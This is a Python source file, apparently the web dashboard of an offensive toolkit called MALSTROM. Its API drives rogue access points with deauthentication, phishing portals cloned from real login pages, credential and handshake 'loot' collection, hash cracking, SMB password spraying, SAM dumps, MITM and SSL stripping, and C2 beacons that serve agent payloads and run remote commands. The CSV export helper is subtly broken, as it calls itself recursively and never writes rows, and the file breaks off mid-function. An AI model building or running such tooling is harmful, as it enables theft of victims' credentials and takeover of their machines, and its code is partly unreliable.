"""Operator dashboard.

Serves the static www/ front end and emulates the old uhttpd CGI API at
/cgi-bin/api.sh so the existing dashboard JS keeps working unchanged:
challenge/auth/session token handshake, status, start/disarm/cleanup, loot,
alerts, templates, recon scan, and a live SSE event stream.
"""

import hashlib
import hmac
import html
import json
import os
import socket
import ssl
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from . import clone
from . import config
from . import linuxutil
from . import recon
from . import state

POST_BODY_CAP = 1024 * 1024  # operator template uploads; anything bigger is junk


def _csv_safe(value):
    """Neutralize Excel/DTP formula-injection triggers in loot CSV cells."""
    if isinstance(value, str) and value[:1] in ('=', '+', '-', '@', '\t', '\r'):
        return "'" + value
    return value

MIME = {
    '.html': 'text/html; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.json': 'application/json',
    '.png': 'image/png',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon',
    '.txt': 'text/plain; charset=utf-8',
}


def _sha256(value):
    return hashlib.sha256(value.encode('utf-8')).hexdigest()


SEC_HEADERS = [
    ('X-Frame-Options', 'DENY'),
    ('X-Content-Type-Options', 'nosniff'),
    ('Referrer-Policy', 'no-referrer'),
    ('Content-Security-Policy',
     "default-src 'self'; style-src 'self' 'unsafe-inline'; "
     "img-src 'self' data:; frame-ancestors 'none'; base-uri 'self'; "
     "form-action 'self'"),
    ('X-Robots-Tag', 'noindex, nofollow'),
]


def _loopback(host):
    return host.rstrip('.').lower() in ('127.0.0.1', 'localhost', '::1',
                                        '::ffff:127.0.0.1')


def _netloc_parts(netloc):
    """Split a URL netloc into (host, port); loopback aliases normalize to
    host='@loopback' so 127.0.0.1 / localhost / ::1 are interchangeable."""
    netloc = (netloc or '').lower()
    port = ''
    if netloc.startswith('['):
        end = netloc.find(']')
        if end < 0:
            return ('', '')
        host = netloc[1:end]
        rest = netloc[end + 1:]
        if rest.startswith(':'):
            port = rest[1:]
    elif netloc.count(':') == 1:
        host, port = netloc.split(':')
    else:
        host = netloc
    return ('@loopback' if _loopback(host) else host, port)


# Operator API calls that change state; everything else in the dispatch is
# treated as read-only and is not recorded on the audit trail.
MUTATING_ACTIONS = frozenset([
    'start', 'disarm', 'autopwn', 'shield', 'whitelist_clear', 'unshield',
    'cleanup', 'reset', 'reset_stock', 'loot_clear', 'pin', 'adopt_ssid',
    'save_template', 'clone_page', 'scan_start', 'spray', 'dump', 'crack',
    'mitm', 'relay', 'beacon', 'beacon_cmd', 'beacon_file', 'beacon_fwd',
    'beacon_term', 'beacon_termcmd', 'settings_set', 'key_rotate',
])


class DashHandler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    server_version = 'MALSTROM-DASH'
    app = None          # set by server
    _status_cache = None
    _status_cache_at = 0.0
    timeout = 15        # close idle keep-alive sockets so threads don't pile up

    def log_message(self, *args):
        pass

    # --- plumbing -------------------------------------------------------------
    def _query(self):
        return urllib.parse.parse_qs(
            urllib.parse.urlparse(self.path).query, keep_blank_values=True)

    def _q(self, name, default=''):
        return self._query().get(name, [default])[0]

    def _json(self, obj, code=200):
        data = json.dumps(obj).encode('utf-8')
        self.send_response(code)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', str(len(data)))
        self.send_header('Cache-Control', 'no-store')
        self._sec_headers()
        self.end_headers()
        try:
            self.wfile.write(data)
        except OSError:
            pass

    def _authed(self):
        if not state.auth_enabled():
            return True
        given = self._q('token')
        return state.session_valid(given)

    def _deny(self):
        self._json({'ok': 0, 'error': 'auth required'})

    def _sec_headers(self):
        for k, v in SEC_HEADERS:
            self.send_header(k, v)

    def _origin_ok(self):
        """Cross-site-request guard.

        Browsers attach an Origin header to cross-origin fetches/forms and a
        Referer to cross-site tag loads; neither is sent by plain loopback
        clients (curl, the CLI). A present-but-mismatched value is the only
        way a browser-resident cross-site page can drive this API, so we only
        reject on a mismatch — sandboxing "absent = trusted" for the CLI.
        """
        host_hdr = self.headers.get('Host') or ''
        want_h, want_p = _netloc_parts(host_hdr)
        for hdr in ('Origin', 'Referer'):
            val = (self.headers.get(hdr) or '').strip()
            if not val:
                continue
            try:
                netloc = urllib.parse.urlparse(val).netloc
            except ValueError:
                netloc = ''
            if not netloc:
                continue
            h, p = _netloc_parts(netloc)
            host_ok = (h == want_h) or (h == '@loopback' and want_h == '@loopback')
            if not host_ok:
                return False
            if p and want_p and p != want_p:
                return False
            if p and not want_p and p not in ('80', '443'):
                return False
        return True

    def _audit_detail(self):
        """Sanitized request summary for the operator audit trail — never the
        token/session or the nonce (those exist to authorize)."""
        q = self._query()
        skip = ('action', 'token', 'sid', 'nonce', 'resp')
        parts = []
        for k, v in q.items():
            if k in skip or not v:
                continue
            s = v[0] if isinstance(v, list) else str(v)
            parts.append('%s=%s' % (k, str(s)[:80]))
        return ' '.join(parts)[:768]

    def _client_addr(self):
        try:
            return self.client_address[0]
        except (TypeError, IndexError, AttributeError):
            return ''

    def _audit_mutating(self, action):
        if action in MUTATING_ACTIONS:
            state.audit(action, self._audit_detail(), self._client_addr())

    # --- static -----------------------------------------------------------------
    def _static(self):
        path = urllib.parse.urlparse(self.path).path
        if path in ('/', ''):
            path = '/index.html'
        path = urllib.parse.unquote(path).lstrip('/')
        root = os.path.realpath(config.WWW_DIR)
        full = os.path.realpath(os.path.join(root, path))
        if not full.startswith(root + os.path.sep) \
                or not os.path.isfile(full):
            self.send_error(404)
            return
        ext = os.path.splitext(full)[1].lower()
        ctype = MIME.get(ext, 'application/octet-stream')
        try:
            with open(full, 'rb') as fh:
                body = fh.read()
        except OSError:
            self.send_error(500)
            return
        self.send_response(200)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Cache-Control', 'no-store')
        self._sec_headers()
        self.end_headers()
        try:
            self.wfile.write(body)
        except OSError:
            pass

    # --- actions ----------------------------------------------------------------
    def _action_challenge(self):
        nonce = os.urandom(16).hex() + str(time.time())
        state.set_nonce(nonce)
        self._json({'ok': 1, 'nonce': state.get_nonce()})

    def _action_auth(self):
        nonce = self._q('nonce')
        resp = self._q('resp')
        tok = self._q('token')
        if not nonce or (not resp and not tok):
            self._json({'ok': 0, 'error': 'bad request'})
            return
        if not state.get_nonce() or state.get_nonce() != nonce:
            self._json({'ok': 0, 'error': 'no challenge'})
            return
        token = config.TOKEN or state.get_token()
        expected = _sha256('%s:%s' % (nonce, token)) if token else ''
        if not expected:
            self._json({'ok': 0, 'error': 'no token provisioned'})
            return
        got = resp or (_sha256('%s:%s' % (nonce, tok)) if tok else '')
        if got and hmac.compare_digest(got, expected):
            # Consume the challenge so a captured challenge/response pair
            # cannot be replayed to mint fresh sessions.
            state.set_nonce(os.urandom(16).hex() + str(time.time()))
            sid = os.urandom(8).hex()
            state.set_session(sid)
            state.emit('INFO', 'operator authenticated')
            self._json({'ok': 1, 'sid': sid})
        else:
            self._json({'ok': 0, 'error': 'denied'})

    def _action_status(self):
        now = time.time()
        if DashHandler._status_cache and now - DashHandler._status_cache_at < 2:
            self._json(DashHandler._status_cache)
            return
        st = state.load_state()
        arp = {}
        try:
            with open('/proc/net/arp') as fh:
                next(fh, None)
                for line in fh:
                    parts = line.split()
                    if len(parts) >= 4 and parts[3] != '00:00:00:00:00:00':
                        if parts[0] != config.PORTAL_IP:
                            arp[parts[0]] = parts[3]
        except IOError:
            pass
        leases = {}
        try:
            with open(config.DHCP_LEASE_FILE) as fh:
                for line in fh:
                    p = line.split()
                    if len(p) >= 5:
                        leases[p[2]] = p[3]
        except IOError:
            pass
        seen = set()
        clients = []
        portal_prefix = '.'.join(str(config.PORTAL_NET).split('.')[:3]) + '.'
        for ip, mac in arp.items():
            if not str(ip).startswith(portal_prefix):
                continue
            clients.append({'ip': ip, 'mac': mac, 'name': leases.get(ip, '')})
            seen.add(ip)
        for ip, name in leases.items():
            if ip not in seen and str(ip).startswith(portal_prefix):
                clients.append({'ip': ip, 'mac': '', 'name': name})
                seen.add(ip)
        sysinfo = self.app.sysinfo()
        result = {
            'ok': 1,
            'engine': 1 if sysinfo['alive'] else 0,
            'state': st,
            'creds_count': state.count_creds(),
            'devices_count': len(state.read_devices()),
            'handshakes_count': len(state.read_handshakes()),
            'probes_count': len(state.read_probes()),
            'hashes_count': len(state.read_hashes()),
            'cracked_count': len(state.read_cracked()),
            'owned_count': len(state.read_owned()),
            'beacon_count': len(state.read_beacons()),
            'mitm_active': 1 if getattr(self.app, 'mitm', None) and self.app.mitm.running() else 0,
            'scan_busy': 1 if getattr(self.app, 'scan', None) and self.app.scan.running() is not None else 0,
            'auto_harvest': 1 if st.get('auto_harvest') else 0,
            'auto_armed': 1 if st.get('auto_armed') else 0,
            'clients': clients,
            'whitelist': state.read_whitelist(),
            'sys': sysinfo,
        }
        DashHandler._status_cache = result
        DashHandler._status_cache_at = now
        self._json(result)

    def _action_start(self):
        st = state.load_state()
        ssid = self._q('ssid').strip()
        if not ssid:
            self._json({'ok': 0, 'error': 'ssid required'})
            return
        portal_mode = self._q('portal_mode', st['portal_mode'])
        psk = self._q('psk', st.get('wpa_psk', ''))
        if portal_mode == 'wpa' and not psk:
            psk = 'M%s-%s-%s' % (os.urandom(2).hex(), os.urandom(2).hex(),
                                 os.urandom(2).hex())
        elif portal_mode == 'wpa' and not 8 <= len(psk) <= 63:
            self._json({'ok': 0, 'error': 'wpa psk must be 8-63 characters'})
            return
        continuous = self._q('continuous', '1') != '0'
        channel = self._q('channel', st.get('target_channel', '6'))
        channel = str(channel).strip()
        if not (channel.isdigit() and 1 <= int(channel) <= 165):
            self._json({'ok': 0, 'error': 'channel must be 1-165'})
            return
        bssid = self._q('bssid', st.get('target_bssid', '')).strip()
        if bssid and not state.is_mac(bssid):
            self._json({'ok': 0, 'error': 'bssid must be a mac address '
                                         '(xx:xx:xx:xx:xx:xx)'})
            return
        try:
            burst = int(self._q('burst', str(st.get('deauth_burst', 25))) or 25)
        except (TypeError, ValueError):
            burst = 25
        try:
            delay = float(self._q('delay', str(st.get('deauth_delay', 1))) or 1)
        except (TypeError, ValueError):
            delay = 1
        try:
            rot = int(self._q('beacon_rotate',
                              str(st.get('beacon_rotate', config.BEACON_ROTATE)))
                      or 0)
            if rot != 0 and not 5 <= rot <= 1440:
                raise ValueError
        except ValueError:
            self._json({'ok': 0,
                        'error': 'beacon_rotate must be 0 (off) or 5-1440 minutes'})
            return
        cloak = self._q('ssid_cloak',
                        '1' if st.get('ssid_cloak') else '0') != '0'
        state.write_state({
            'active': True,
            'auto_armed': False,
            'target_ssid': ssid,
            'target_bssid': bssid,
            'target_channel': channel,
            'portal_mode': portal_mode,
            'wpa_psk': psk,
            'portal_ssid': st['portal_ssid'] if state.state_has('portal_ssid') else '',
            'clone_bssid': self._q('clone_bssid', '1' if st.get('clone_bssid') else '0') != '0',
            'wpa3_transition': self._q('wpa3_transition', '1' if st.get('wpa3_transition') else '0') != '0',
            'beacon_rotate': rot,
            'ssid_cloak': cloak,
            'deauth_mode': self._q('deauth_mode', st.get('deauth_mode', 'broadcast')),
            'deauth_burst': burst,
            'deauth_delay': delay,
            'deauth_continuous': continuous,
            'capture_mode': self._q('capture_mode', st.get('capture_mode', 'off')),
            'karma': self._q('karma', '1') != '0',
            'karma_respond': self._q('karma_respond',
                                     '1' if st.get('karma_respond') else '0') != '0',
            'relay': self._q('relay', '1' if st.get('relay') else '0') != '0',
            'shield_after_capture': self._q('shield_after_capture', '1') != '0',
            'template': self._q('template', st.get('template', 'wifi_login')),
            'redir_target': config.REDIRECT_TARGET,
            'auto_harvest': st.get('auto_harvest', False),
            'updated': int(time.time()),
        })
        state.set_template_default(self._q('template', 'wifi_login'))
        state.set_current_ssid(ssid)
        state.emit('INFO', 'target set: %s ch%s [%s portal]' % (
            ssid, self._q('channel', '?'), portal_mode))
        self._json({'ok': 1, 'target': ssid})

    def _action_disarm(self):
        state.archive_engagement()
        st = state.load_state()
        st['active'] = False
        st['auto_armed'] = False
        state.write_state(st)
        state.emit('DEP', 'kill chain disarmed from dashboard')
        self._json({'ok': 1})

    def _action_autopwn(self):
        """Enable or disable the automatic pwnagotchi-style harvester."""
        st = state.load_state()
        on = self._q('on') == '1'
        st['auto_harvest'] = on
        if not on:
            st['active'] = False
            st['auto_armed'] = False
        st['updated'] = int(time.time())
        state.write_state(st)
        state.emit('AUTO', 'autopwn %s' % ('armed' if on else 'disarmed'))
        self._json({'ok': 1, 'auto_harvest': on})

    def _action_autopwn_status(self):
        st = state.load_state()
        ap = getattr(self.app, 'autopwn', None)
        target = ap._target if ap else None
        self._json({
            'ok': 1,
            'auto_harvest': bool(st.get('auto_harvest')),
            'auto_armed': bool(st.get('auto_armed')),
            'target': target,
            'seen': sorted(ap._seen_bssids) if ap else [],
            'interactions': dict(ap._interactions) if ap else {},
        })

    def _action_shield(self):
        mac = self._q('mac').strip().upper()
        if not state.is_mac(mac):
            self._json({'ok': 0, 'error': 'invalid mac'})
            return
        state.add_whitelist(mac)
        on = 'shielded %s (exempt from deauth)' % mac
        state.emit('INFO', on)
        self._json({'ok': 1, 'shield': mac})

    def _action_whitelist_clear(self):
        n = len(state.read_whitelist())
        state.clear_whitelist()
        state.emit('INFO', 'whitelist cleared (%d shielded entries removed — '
                           'portal served to everyone again)' % n)
        self._json({'ok': 1, 'removed': n})

    def _action_unshield(self):
        entry = self._q('id').strip()
        ok = state.remove_whitelist(entry)
        state.emit('INFO', 'unshielded %s (portal served again)' % entry)
        self._json({'ok': 1 if ok else 0, 'removed': ok})

    def _action_cleanup(self):
        state.archive_engagement()
        if self.app:
            self.app.chain_cleanup()
        state.emit('CLEANUP', 'full cleanup requested from dashboard')
        self._json({'ok': 1, 'note': 'original config restored'})

    def _action_reset(self):
        """Factory reset: tear the chain down, then wipe everything."""
        state.archive_engagement()
        if self.app:
            try:
                self.app.chain_cleanup()
            except Exception as exc:
                state.emit('ALERT', 'reset teardown error: %s' % exc)
        state.reset_all(preserve_auth=True)
        state.emit('RESET', 'MALSTROM reset to factory defaults '
                            '(loot, state, settings cleared)')
        self._json({'ok': 1, 'note': 'tool reset to factory defaults'})

    def _action_reset_stock(self):
        """Reset to stock: wipe operational data, keep portals + shields."""
        state.archive_engagement()
        if self.app:
            try:
                self.app.chain_cleanup()
            except Exception as exc:
                state.emit('ALERT', 'stock reset teardown error: %s' % exc)
        state.clear_stock()
        state.emit('RESET', 'MALSTROM reset to stock '
                            '(cleared scans, loot, target state)')
        self._json({'ok': 1, 'note': 'tool reset to stock'})

    def _action_loot_clear(self):
        state.clear_loot()
        state.reset_stores()
        state.emit('CLEANUP', 'loot vault cleared — on-device data wiped '
                              '(pinned items kept)')
        self._json({'ok': 1, 'note': 'loot cleared (pinned items kept)'})

    def _action_pin(self):
        kind = self._q('kind', '')
        ident = self._q('id', '')
        if kind == 'cred':
            data = state.toggle_pinned_cred(ident)
        elif kind == 'device':
            data = state.toggle_pinned_device(ident)
        else:
            self._json({'ok': 0, 'error': 'unknown pin kind'})
            return
        self._json({'ok': 1, 'pinned': data})

    def _action_loot_plain(self):
        body = ''
        try:
            with open(state.CREDS_LOG) as fh:
                body = fh.read()
        except IOError:
            pass
        data = body.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.send_header('Content-Length', str(len(data)))
        self._sec_headers()
        self.end_headers()
        try:
            self.wfile.write(data)
        except OSError:
            pass

    def _loot_files(self):
        out = []
        try:
            for root, dirs, names in os.walk(config.LOOT_DIR):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for n in names:
                    if n.startswith('.'):
                        continue
                    full = os.path.join(root, n)
                    try:
                        rel = os.path.relpath(full, config.LOOT_DIR)
                        out.append({'name': rel, 'size': os.path.getsize(full)})
                    except OSError:
                        continue
        except OSError:
            pass
        out.sort(key=lambda f: f['name'])
        return out

    def _action_loot(self):
        devices = list(state.read_devices().values())
        devices.sort(key=lambda d: d.get('last_seen', ''), reverse=True)
        self._json({
            'ok': 1,
            'creds': state.read_creds(),
            'devices': devices[:200],
            'handshakes': state.read_handshakes(),
            'probes': state.read_probes(),
            'cracked': state.read_cracked(),
            'files': self._loot_files(),
            'pinned': state.read_pinned(),
        })

    def _action_loot_file(self):
        name = self._q('file')
        if not name:
            self._json({'ok': 0, 'error': 'file required'})
            return
        root = os.path.realpath(config.LOOT_DIR) + os.path.sep
        full = os.path.realpath(os.path.join(config.LOOT_DIR, name))
        if not full.startswith(root) or not os.path.isfile(full):
            self._json({'ok': 0, 'error': 'not found'})
            return
        try:
            with open(full, 'rb') as fh:
                body = fh.read()
        except OSError:
            self._json({'ok': 0, 'error': 'unreadable'})
            return
        if name.endswith('.vault') and body:
            from . import vault
            if vault.available():
                try:
                    body = vault.decrypt(body)
                except Exception:
                    self._json({'ok': 0, 'error': 'cannot decrypt vault blob'})
                    return
            ctype = ('text/plain; charset=utf-8'
                     if name.rstrip('.vault').endswith(('.log', '.txt'))
                     else 'application/octet-stream')
            self.send_response(200)
            self.send_header('Content-Type', ctype)
            self.send_header('Content-Disposition',
                             'attachment; filename="%s"'
                             % os.path.basename(name).replace('"', '')
                                .rstrip('.vault'))
            self.send_header('Content-Length', str(len(body)))
            self._sec_headers()
            self.end_headers()
            try:
                self.wfile.write(body)
            except OSError:
                pass
            return
        ctype = ('text/plain; charset=utf-8'
                 if name.endswith(('.json', '.log', '.txt', '.conf'))
                 else 'application/octet-stream')
        self.send_response(200)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Disposition',
                         'attachment; filename="%s"' %
                         os.path.basename(name).replace('"', ''))
        self.send_header('Content-Length', str(len(body)))
        self._sec_headers()
        self.end_headers()
        try:
            self.wfile.write(body)
        except OSError:
            pass

    def _action_export_csv(self):
        import csv
        import io
        kind = self._q('kind', 'creds')
        buf = io.StringIO()
        w = csv.writer(buf)
        safe = lambda cells: safe([_csv_safe(c) for c in cells])
        if kind == 'creds':
            rows = state.read_creds()
            safe(['time', 'template', 'device', 'username',
                        'password', 'hostname', 'mac', 'ip', 'user_agent'])
            for e in rows:
                safe([e.get('ts', ''), e.get('template', ''),
                            e.get('device', ''), e.get('username', ''),
                            e.get('password', ''), e.get('hostname', ''),
                            e.get('mac', ''), e.get('ip', ''), e.get('ua', '')])
        elif kind == 'devices':
            devs = sorted(state.read_devices().values(),
                          key=lambda d: d.get('last_seen', ''), reverse=True)
            safe(['mac', 'os', 'hostname', 'ips', 'creds',
                        'first_seen', 'last_seen'])
            for d in devs:
                safe([d.get('mac', ''), d.get('os', ''),
                            d.get('hostname', ''), ','.join(d.get('ips', [])),
                            d.get('creds', 0), d.get('first_seen', ''),
                            d.get('last_seen', '')])
        elif kind == 'handshakes':
            safe(['time', 'bssid', 'ssid', 'client', 'kind', 'file'])
            for e in state.read_handshakes():
                safe([e.get('ts', ''), e.get('bssid', ''),
                            e.get('ssid', ''), e.get('client', ''),
                            e.get('kind', ''), e.get('file', '')])
        elif kind == 'probes':
            safe(['time', 'mac', 'ssid'])
            for e in state.read_probes():
                safe([e.get('ts', ''), e.get('mac', ''), e.get('ssid', '')])
        elif kind == 'hashes':
            safe(['time', 'source', 'kind', 'user', 'token', 'recovered'])
            for e in state.read_hashes():
                safe([e.get('ts', ''), e.get('src', ''), e.get('kind', 'ntlmv2'),
                            e.get('user', ''), e.get('token', ''),
                            e.get('pass', '')])
        elif kind == 'cracked':
            safe(['time', 'ssid', 'bssid', 'password', 'source', 'file'])
            for e in state.read_cracked():
                safe([e.get('ts', ''), e.get('ssid', ''), e.get('bssid', ''),
                            e.get('psk', ''), e.get('source', ''),
                            e.get('file', '')])
        elif kind == 'owned':
            safe(['time', 'ip', 'proto', 'user', 'password', 'detail'])
            for e in state.read_owned():
                safe([e.get('ts', ''), e.get('ip', ''),
                            e.get('proto', ''), e.get('user', ''),
                            e.get('pass', ''), e.get('msg', '')])
        elif kind == 'beacons':
            safe(['id', 'ip', 'host', 'os', 'user',
                        'first_seen', 'last_seen', 'tasks'])
            for s in sorted(state.read_beacons().values(),
                            key=lambda x: x.get('last_seen', ''), reverse=True):
                safe([s.get('id', ''), s.get('ip', ''),
                            s.get('host', ''), s.get('os', ''),
                            s.get('user', ''), s.get('first_seen', ''),
                            s.get('last_seen', ''), len(s.get('tasks', []))])
        data = buf.getvalue().encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/csv; charset=utf-8')
        self.send_header('Content-Disposition',
                         'attachment; filename="malstrom_%s.csv"' % kind)
        self.send_header('Content-Length', str(len(data)))
        self._sec_headers()
        self.end_headers()
        try:
            self.wfile.write(data)
        except OSError:
            pass

    def _action_adopt_ssid(self):
        ssid = self._q('ssid').strip()
        if not ssid:
            self._json({'ok': 0, 'error': 'ssid required'})
            return
        st = state.load_state()
        st['target_ssid'] = ssid
        st['updated'] = int(time.time())
        state.write_state(st)
        state.set_current_ssid(ssid)
        state.emit('INFO', 'karma adopt: rogue AP re-cloned to "%s"' % ssid)
        self._json({'ok': 1, 'target': ssid})

    def _action_save_template(self):
        name = self._q('name').strip()
        body = self._q('html')
        if not name or not body:
            self._json({'ok': 0, 'error': 'name and html required'})
            return
        if state.save_custom_template(name, body):
            state.emit('INFO', 'custom template "%s" stored (local)' % name)
            self._json({'ok': 1, 'name': name})
        else:
            self._json({'ok': 0, 'error': 'save failed'})

    def _action_clone_page(self):
        """Wifiphisher-style: fetch a real login page and store it as a
        custom portal template (assets are proxied through the rogue portal)."""
        url = self._q('url').strip()
        if not url:
            self._json({'ok': 0, 'error': 'url required'})
            return
        try:
            body = clone.clone_page(url)
        except IOError as exc:
            self._json({'ok': 0, 'error': str(exc)})
            return
        name = 'clone_%s' % time.strftime('%Y%m%d%H%M%S')
        if not state.save_custom_template(name, body):
            self._json({'ok': 0, 'error': 'save failed'})
            return
        state.set_template_default(name)
        state.emit('INFO', 'portal cloned from %s -> template "%s" (rollout: '
                           'next victim render)' % (url, name))
        self._json({'ok': 1, 'name': name, 'template': name})

    def _action_ops(self):
        runs = False
        if getattr(self.app, 'scan', None):
            runs = self.app.scan.running() is not None
        sprays = [s for s in state.list_scans() if s.get('kind') == 'spray'
                  and s.get('status') == 'running']
        beacons = sorted(state.read_beacons().values(),
                         key=lambda s: s.get('last_seen', ''), reverse=True)
        try:
            interval = int(state.read_settings().get('beacon_interval')
                           or config.BEACON_INTERVAL)
        except (TypeError, ValueError):
            interval = config.BEACON_INTERVAL
        now = time.time()
        for s in beacons:
            age = -1
            try:
                age = now - time.mktime(time.strptime(
                    s.get('last_seen', ''), '%Y-%m-%d %H:%M:%S UTC'))
            except (ValueError, OverflowError, OSError):
                pass
            s['age'] = int(age)
            s['state'] = ('dead' if age < 0 or age > interval * 12
                          else 'stale' if age > interval * 3 else 'live')
            s['fws'] = [t.get('fw') for t in s.get('tasks', [])
                        if t.get('kind') == 'fw']
        self._json({
            'ok': 1,
            'scans': state.list_scans(),
            'owned': state.read_owned(),
            'hashes': state.read_hashes(),
            'beacons': beacons,
            'scan_busy': 1 if runs else 0,
            'spray_busy': 1 if getattr(self.app, 'lateral', None)
                           and self.app.lateral.busy() else 0,
            'mitm': {
                'running': 1 if getattr(self.app, 'mitm', None)
                             and self.app.mitm.running() else 0,
                'iface': getattr(self.app, 'mitm', None) and self.app.mitm.iface or '',
                'tail': getattr(self.app, 'mitm', None) and self.app.mitm.tail[-60:] or [],
            },
            'beacon': {
                'on': 1 if getattr(self.app, 'beacon', None)
                          and self.app.beacon.enabled() else 0,
                'key': state.get_beacon_key() if getattr(self.app, 'beacon', None) else '',
                'interval': config.BEACON_INTERVAL,
            },
            'spray_running': len(sprays),
        })

    def _action_scan_start(self):
        if not self.app or not hasattr(self.app, 'scan'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        target = self._q('target').strip()
        kind = self._q('kind', 'ports')
        if not target:
            self._json({'ok': 0, 'error': 'target CIDR / host required'})
            return
        res = self.app.scan.start_job(kind, target,
                                      {'range': self._q('range', state.read_settings().get(
                                          'scan_range') or config.SCAN_PORT_RANGE)})
        if res.get('ok'):
            state.emit('INFO', 'scan queued: %s on %s' % (kind, target))
        self._json(res)

    def _action_spray(self):
        if not self.app or not hasattr(self.app, 'lateral'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        try:
            limit = int(self._q('limit', '0') or 0)
        except (TypeError, ValueError):
            limit = 0
        res = self.app.lateral.spray(
            targets=self._q('targets'),
            user=self._q('user'),
            password=self._q('pass'),
            protos=self._q('protos', 'smb'),
            limit=limit)
        self._json(res)

    def _action_dump(self):
        if not self.app or not hasattr(self.app, 'lateral'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        res = self.app.lateral.dump(
            targets=self._q('targets'),
            user=self._q('user'),
            password=self._q('pass'),
            kind=self._q('kind', 'sam'))
        if res.get('ok'):
            state.emit('INFO', '%s dump queued: %s' % (
                self._q('kind', 'sam').upper(), self._q('targets')))
        self._json(res)

    def _action_crack(self):
        """Operator-armed hashcat pass over the uncracked vault tokens."""
        if not self.app or not hasattr(self.app, 'lateral'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        res = self.app.lateral.crack_hashes()
        if res.get('ok'):
            state.emit('INFO', 'hash crack queued (hashcat 5600/1000)')
        self._json(res)

    def _action_hashcat_export(self):
        """Convert a handshake pcap to hashcat 22000 (PMKID+EAPOL) on the fly."""
        name = self._q('file')
        if not name:
            self._json({'ok': 0, 'error': 'file required'})
            return
        root = os.path.realpath(config.LOOT_DIR) + os.path.sep
        full = os.path.realpath(os.path.join(config.LOOT_DIR, name))
        if not full.startswith(root) or not os.path.isfile(full):
            self._json({'ok': 0, 'error': 'not found'})
            return
        r = linuxutil.run(['hcxpcapngtool', '-o', '-', full], timeout=90)
        body = (r.stdout or '').strip()
        if r.returncode != 0 or not body:
            err = (r.stderr or '').strip()[:200] or 'hcxpcapngtool failed'
            if not linuxutil.have('hcxpcapngtool'):
                err += ' — hcxtools missing'
            self._json({'ok': 0, 'error': err})
            return
        body += '\n'
        data = body.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type',
                         'text/plain; charset=utf-8')
        self.send_header('Content-Disposition',
                         'attachment; filename="%s.22000"' %
                         os.path.basename(name).replace('"', ''))
        self.send_header('Content-Length', str(len(data)))
        self._sec_headers()
        self.end_headers()
        try:
            self.wfile.write(data)
        except OSError:
            pass

    def _action_mitm(self):
        if not self.app or not hasattr(self.app, 'mitm'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        if self._q('on') == '1':
            iface = (self._q('iface') or self.app.mitm.iface
                     or state.read_settings().get('mitm_iface', ''))
            res = self.app.mitm.start(iface)
        else:
            res = self.app.mitm.stop()
        self._json(res)

    def _action_relay(self):
        """Arm/disarm the HTTP relay / SSL-strip-lite transparent proxy."""
        on = self._q('on') == '1'
        st = state.load_state()
        st['relay'] = on
        state.write_state(st)
        state.emit('MITM', 'HTTP relay / SSL-strip-lite %s' %
                   ('armed' if on else 'disarmed'))
        self._json({'ok': 1, 'relay': on})

    def _action_beacon(self):
        if not self.app or not hasattr(self.app, 'beacon'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        self._json(self.app.beacon.set_enabled(self._q('on') == '1'))

    def _action_beacon_payload(self):
        if not self.app or not hasattr(self.app, 'beacon'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        kind = self._q('kind', 'sh')
        if kind not in ('sh', 'ps1'):
            self._json({'ok': 0, 'error': 'bad payload kind'})
            return
        body = self.app.beacon.payload(kind)
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.send_header('Content-Disposition',
                         'attachment; filename="malstrom-agent.%s"' % kind)
        self.send_header('Content-Length', str(len(body)))
        self._sec_headers()
        self.end_headers()
        try:
            self.wfile.write(body.encode('utf-8'))
        except OSError:
            pass

    def _action_beacon_cmd(self):
        if not self.app or not hasattr(self.app, 'beacon'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        self._json(self.app.beacon.add_command(self._q('sid'), self._q('cmd')))

    def _action_beacon_file(self):
        if not self.app or not hasattr(self.app, 'beacon'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        sid = self._q('sid')
        path = self._q('path')
        if not sid or not path:
            self._json({'ok': 0, 'error': 'sid and path required'})
            return
        self._json(self.app.beacon.add_file(sid, path))

    def _action_beacon_ls(self):
        if not self.app or not hasattr(self.app, 'beacon'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        self._json(self.app.beacon.add_ls(self._q('sid'), self._q('path')))

    def _action_beacon_fwd(self):
        if not self.app or not hasattr(self.app, 'beacon'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        self._json(self.app.beacon.add_fwd(self._q('sid'), self._q('spec')))

    def _action_beacon_term(self):
        if not self.app or not hasattr(self.app, 'beacon'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        self._json(self.app.beacon.set_term(self._q('sid'), self._q('on') == '1'))

    def _action_beacon_termcmd(self):
        if not self.app or not hasattr(self.app, 'beacon'):
            self._json({'ok': 0, 'error': 'engine unavailable'})
            return
        self._json(self.app.beacon.add_command(self._q('sid'), self._q('cmd'),
                                               kind='term'))

    # --- settings ------------------------------------------------------------
    def _action_settings(self):
        info = {'ok': 1}
        try:
            with open(os.path.join(config.STATE_DIR, 'token')) as fh:
                info['token'] = fh.read().strip()
        except IOError:
            info['token'] = ''
        info['key'] = state.get_beacon_key()
        base = config.DASH_HOST
        up = linuxutil.default_route_iface()
        if up:
            ip = linuxutil.iface_ipv4(up)
            if ip:
                base = ip
        info['lan_ip'] = '' if base in ('0.0.0.0', '127.0.0.1') else base
